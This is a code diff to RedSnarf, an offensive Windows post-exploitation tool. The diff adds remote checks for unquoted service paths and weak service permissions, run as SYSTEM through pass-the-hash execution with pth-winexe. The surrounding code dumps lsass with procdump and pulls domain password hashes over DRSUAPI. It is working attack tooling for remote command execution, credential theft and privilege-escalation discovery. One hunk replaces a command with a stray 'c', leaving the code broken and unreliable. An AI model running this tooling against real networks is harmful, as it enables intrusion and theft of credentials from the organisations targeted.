@@ -1046,6 +1046,91 @@ def datadump(user, passw, host, path, os_version):
 				print colored("[-]No logged on users found: "+host,'red')	
 				logging.debug("[-]No logged on users found: "+host)
 
+			#Check for Unquotes service paths
+			#Base command wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v taken from
+			#https://www.commonexploits.com/unquoted-service-paths/
+			unquoted=[]
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode |findstr /i \"auto\" \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			services = proc.communicate()[0]	
+						
+			for service in services.splitlines():
+				#If the line does not contain c:\windows
+				if not "C:\WINDOWS\\" in service.upper():
+					#If the line is not blank
+					if len(service)>0:
+						#If the line does not contain a " 
+						if not "\"" in service.upper():	
+							#Add the service to our list
+							unquoted.append(service)
+
+			#If the list is not empty
+			if len(unquoted)>0:
+				#Print a header
+				print colored("\n[!]Unquoted Service Paths Found",'red')
+				
+				#Open file handler
+				thefile = open(outputpath+targets[0]+'/unquotesservicepaths.txt', 'a')
+				
+				#Add to file when we started enumerating shares and using which account
+				thefile.write("Unquoted Service Paths - Enumerated at "+time.strftime("%c")+'\n')
+				
+				#Cycle through list
+				for i in xrange(len(unquoted)):
+					#Print unquoted services.
+					print unquoted[i].strip()[:len(unquoted[i].strip())-40]
+					thefile.write(unquoted[i].strip())
+
+				#Close file handle
+				thefile.close()
+
+				#Check file exists and then print message to screen
+				if os.path.isfile(outputpath+targets[0]+'/unquotesservicepaths.txt'):
+					print colored("[+]Unquoted Service Paths saved to "+outputpath+targets[0]+'/unquotesservicepaths.txt'+"\n",'yellow')
+
+			#We'll get a list of Windows Services and their paths
+			#wmic service get name,startname,PathName
+			weakservicepermissions=[]
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			services = proc.communicate()[0]		
+			for service in services.splitlines():
+				#If the line does not contain c:\windows
+				if not "C:\WINDOWS\\" in service.upper():
+					#If the line is not blank
+					if len(service)>0:
+						#If the line does not contain a C:\PROGRAM FILES 
+						if not "C:\PROGRAM FILES" in service.upper():	
+							#Filter out WINEXESVC - however this may not reveal previous instances not installed by the snarf...
+							if not "WINEXESVC" in service.upper():
+								if "C:\\" in service.upper():
+									#Add the service to our list
+									weakservicepermissions.append(service)
+
+			#If the list is not empty
+			if len(weakservicepermissions)>0:
+				#Print a header
+				print colored("\n[!]Possible Weak Service Permissions Found - (Service(s) found installed outside of Program Files and Windows Folders)",'red')
+				
+				#Open file handler
+				thefile = open(outputpath+targets[0]+'/weakservicepermissions.txt', 'a')
+				
+				#Add to file when we started enumerating shares and using which account
+				thefile.write("\nPossible Weak Service Permissions - Enumerated at "+time.strftime("%c")+'\n')
+				
+				#Cycle through list
+				for i in xrange(len(weakservicepermissions)):
+					#Print weakservicepermissions services.
+					print weakservicepermissions[i].strip()[:len(weakservicepermissions[i].strip())-40]
+					thefile.write(weakservicepermissions[i].strip())
+
+				#Close file handle
+				thefile.close()
+
+				#Check file exists and then print message to screen
+				if os.path.isfile(outputpath+targets[0]+'/weakservicepermissions.txt'):
+					print colored("\n[+]Possible Weak Service Permissions saved to "+outputpath+targets[0]+'/weakservicepermissions.txt','yellow')
+					print colored("[+]Check using ",'yellow')+colored("'accesschk.exe -uwcqv %username%/everyone/users * -accepteula' ",'white')+colored("from sysinternals "+"\n",'yellow')
+
+			#Dump lsass using procdump from sysinternals
 			if lsass_dump in yesanswers:
 				if not os.path.isfile("/opt/Procdump/procdump.exe"):
 					print colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red')
@@ -2147,7 +2232,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5i", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -4183,7 +4268,10 @@ if drsuapi in yesanswers:
 					print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
 					pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
 					pwdump = pwdumpmatch.match(passw)
-			
+					
+					if pwdump:
+						passw=passw[0:-3]
+
 					response = raw_input("Do you want to extract hashes with history?: Y/(N) ")
 					if response in yesanswers:		
 						if pwdump:
@@ -4237,7 +4325,7 @@ if drsuapi in yesanswers:
 				print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
 				pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
 				pwdump = pwdumpmatch.match(passw)
-			
+				
 				if pwdump:
 					passw=passw[0:-3]
 
@@ -4726,7 +4814,7 @@ if user_desc in yesanswers:
 if service_accounts !='n':
 	if service_accounts in yesanswers:
 		print colored("\n[+]Checking for services running as users: "+targets[0]+"\n",'yellow')
-		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
+		c
 		os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get users.txt\' 2>/dev/null")
 		os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
 		res = os.stat(outputpath+targets[0]+"/users.txt").st_size > 3
